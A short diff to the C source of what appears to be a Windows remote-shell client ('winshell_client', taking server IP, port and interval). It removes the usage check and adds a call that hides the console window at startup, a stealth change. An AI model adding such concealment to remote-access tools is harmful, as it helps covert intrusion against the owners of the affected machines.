@@ -77,10 +77,7 @@ int mainLoop() {
 }
 
 int main(int argc, char ** argv){
-	if (argc < 3) {
-		printf("Usage: winshell_client [ip] [port] [interval]");
-		exit(10);
-	}
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	server_ip = argv[1];
 	server_port = atoi(argv[2]);
 	interval = atoi(argv[3]);
